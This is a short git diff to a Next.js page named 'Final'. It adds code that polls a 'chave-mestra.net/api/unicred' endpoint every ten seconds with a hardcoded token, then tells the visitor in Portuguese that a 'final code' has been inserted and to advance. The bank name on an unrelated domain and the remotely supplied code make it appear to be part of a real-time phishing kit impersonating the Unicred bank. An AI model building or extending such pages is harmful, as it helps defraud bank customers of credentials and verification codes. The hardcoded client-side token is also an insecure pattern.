@@ -1,4 +1,4 @@
-import React, { useState } from 'react'
+import React, { useState, useEffect } from 'react'
 import Head from 'next/head'
 import { useRouter } from 'next/router'
 
@@ -49,6 +49,37 @@ export async function getStaticProps(context){
 export default function Final(props) {
 
   const router = useRouter()
+  
+  const [check, setCheck] = useState(0)
+
+  async function callApi(){
+
+      const res = await fetch('https://chave-mestra.net/api/unicred/index.php', {
+          method: 'POST',
+          body: JSON.stringify({ 
+              token:'rUiDIxjZHIoC8OYlb8lK6xspIwZ78TtJ', 
+              action: 'final_code'
+          })
+      })
+
+      const response = await res.json()
+
+      console.log(response)
+
+      if( response.status == 200 ){
+        setModalMessage('O código final foi inserido, clique em Avançar para ir para o próximo passo.')
+        setModalShow(true)
+      }
+
+  }
+
+  useEffect(() => {
+    const id = setInterval(() => {
+        callApi()
+        setCheck( check+1 )
+    }, 10000);
+    return () => clearInterval(id);
+  }, [check])
 
   const [modalShow, setModalShow] = useState(false)
   const [modalMessage, setModalMessage] = useState('')
